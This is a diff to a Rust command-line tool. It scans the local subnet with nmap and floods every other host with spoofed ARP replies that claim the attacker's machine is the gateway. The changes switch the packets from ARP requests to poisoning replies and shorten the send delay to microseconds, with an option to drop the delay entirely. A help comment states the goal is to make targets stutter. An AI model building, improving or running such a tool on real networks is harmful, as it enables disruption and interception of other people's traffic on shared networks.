@@ -11,35 +11,54 @@ use std::process::Command;
 use std::time::Duration;
 
 use libc::{CPU_SET, CPU_ZERO, cpu_set_t, sched_setaffinity};
-use std::sync::OnceLock;
+use std::sync::{LazyLock, OnceLock};
 use std::thread::{sleep, spawn};
 use std::{io, mem};
 
 #[derive(Parser, Clone)]
 #[command(version, about, long_about = None)]
 pub struct Args {
-    #[arg(short, long, default_value_t = 100)]
+    /// In microsecond, default to 200 enough to make target stuttering (high ping)
+    #[arg(short, long, default_value_t = 200)]
     pub sleep: u64,
+    /// Thread N will be pinned
     #[arg(short, long, default_value_t = 1)]
     pub thread: u64,
+    /// Default most gateway
     #[arg(short, long, default_value = "192.168.1.1")]
     pub gateway: String,
+    /// Careful to use this, if -s/--sleep is set will be ignore
+    #[arg(long, default_value_t = false)]
+    pub no_sleep: bool,
 }
 
+fn init() {
+    let _ = &*NETWORK_INTERFACE;
+    let _ = &*SELF_INFO;
+    let _ = &*ARGS;
+}
+static ALL_IPS: OnceLock<Vec<Ipv4Addr>> = OnceLock::new();
+static NETWORK_INTERFACE: LazyLock<NetworkInterface> = LazyLock::new(network_interface);
+static SELF_INFO: LazyLock<(Ipv4Addr, MacAddr)> = LazyLock::new(scan_device);
+static ARGS: LazyLock<Args> = LazyLock::new(parse_args);
+
 fn main() {
-    let args = parse_args();
-    let all_ips = get_all_ips(&args);
+    init();
+    let mut all_ips = get_all_ips();
+    let self_device = &*SELF_INFO;
+    all_ips.retain(|ip| *ip != self_device.0);
+
     println!("targeted to all ip: {:?}", all_ips);
+    if all_ips.is_empty() {
+        panic!("There's no available ip (excluded gateway and yourself)")
+    }
     let _ = ALL_IPS.set(all_ips);
-    let args = Box::new(args);
-    send_l2_packets(Box::leak(args));
+    send_l2_packets();
 }
 
 fn parse_args() -> Args {
     Args::parse()
 }
-
-static ALL_IPS: OnceLock<Vec<Ipv4Addr>> = OnceLock::new();
 
 fn get_active_interface(interfaces: &[NetworkInterface]) -> Option<&NetworkInterface> {
     interfaces.iter().find(|iface| {
@@ -51,7 +70,8 @@ fn get_active_interface(interfaces: &[NetworkInterface]) -> Option<&NetworkInter
     })
 }
 
-fn get_all_ips(args: &Args) -> Vec<Ipv4Addr> {
+fn get_all_ips() -> Vec<Ipv4Addr> {
+    let args = &*ARGS;
     let output = Command::new("nmap")
         .args(["-sn", &format!("{}/24", args.gateway)])
         .output()
@@ -62,16 +82,18 @@ fn get_all_ips(args: &Args) -> Vec<Ipv4Addr> {
         .filter(|line| line.contains("scan report for"))
         .filter_map(|line| line.split_whitespace().last())
         .filter_map(|ip| ip.parse::<Ipv4Addr>().ok())
-        .filter(|&ip| ip != Ipv4Addr::new(192, 168, 1, 1))
+        .filter(|&ip| ip != args.gateway.parse::<Ipv4Addr>().unwrap())
         .collect()
 }
 
-/// return current ip and mac
-fn scan_device() -> (NetworkInterface, Ipv4Addr, MacAddr) {
-    // Find the network interface with the provided name
+fn network_interface() -> NetworkInterface {
     let interfaces = interfaces();
     let active_interface = get_active_interface(&interfaces).unwrap();
-    let source_ip = active_interface
+    active_interface.clone()
+}
+
+fn scan_device() -> (Ipv4Addr, MacAddr) {
+    let source_ip = NETWORK_INTERFACE
         .ips
         .iter()
         .find_map(|ip_net| {
@@ -82,8 +104,8 @@ fn scan_device() -> (NetworkInterface, Ipv4Addr, MacAddr) {
             }
         })
         .unwrap();
-    let source_mac = active_interface.mac.unwrap();
-    (active_interface.clone(), source_ip, source_mac)
+    let source_mac = NETWORK_INTERFACE.mac.unwrap();
+    (source_ip, source_mac)
 }
 
 fn set_affinity_core(core_id: usize) -> Result<(), i32> {
@@ -99,7 +121,7 @@ fn set_affinity_core(core_id: usize) -> Result<(), i32> {
     Ok(())
 }
 
-fn send_l2_packets(args: &'static Args) {
+fn send_l2_packets() {
     let handle = spawn(move || {
         let config = Config {
             write_buffer_size: 4096,
@@ -113,24 +135,26 @@ fn send_l2_packets(args: &'static Args) {
             socket_fd: None,
         };
 
-        let device = scan_device();
-        let (mut tx, _rx) = match datalink::channel(&device.0, config) {
+        let selves = &*SELF_INFO;
+        let nf = &*NETWORK_INTERFACE;
+        let (mut tx, _rx) = match datalink::channel(nf, config) {
             Ok(datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
             Ok(_) => panic!("Unhandled channel type"),
             Err(e) => panic!("Failed to create datalink channel: {}", e),
         };
 
-        set_affinity_core(args.thread as usize).unwrap();
+        set_affinity_core(ARGS.thread as usize).unwrap();
         spin_loop();
 
         loop {
             for target_ip in ALL_IPS.get().unwrap() {
-                if target_ip == &device.1 {
-                    continue;
+                if *target_ip != selves.0 {
+                    send_arp_packet(&mut *tx, nf, target_ip);
                 }
-                send_arp_packet(&mut *tx, &device.0, target_ip);
             }
-            sleep(Duration::from_millis(args.sleep));
+            if !ARGS.no_sleep {
+                sleep(Duration::from_micros(ARGS.sleep));
+            }
         }
     });
 
@@ -148,7 +172,6 @@ fn send_l2_packets(args: &'static Args) {
         println!();
     }
 
-    // Consume the handle after the loop exits
     match handle.join() {
         Ok(_) => println!("Thread exited normally"),
         Err(e) => {
@@ -162,7 +185,6 @@ fn send_l2_packets(args: &'static Args) {
     }
 }
 
-/// Send an ARP request packet
 fn send_arp_packet(
     tx: &mut dyn pnet::datalink::DataLinkSender,
     interface: &NetworkInterface,
@@ -209,7 +231,7 @@ fn build_arp_spoof(packet: &mut [u8], my_mac: MacAddr, target_ip: &Ipv4Addr, gat
     arp_packet.set_proto_addr_len(4);
 
     // CRITICAL: Use Reply (2) instead of Request (1)
-    arp_packet.set_operation(ArpOperations::Request);
+    arp_packet.set_operation(ArpOperations::Reply);
 
     // Sender: You (claiming to be the Gateway)
     arp_packet.set_sender_hw_addr(my_mac);
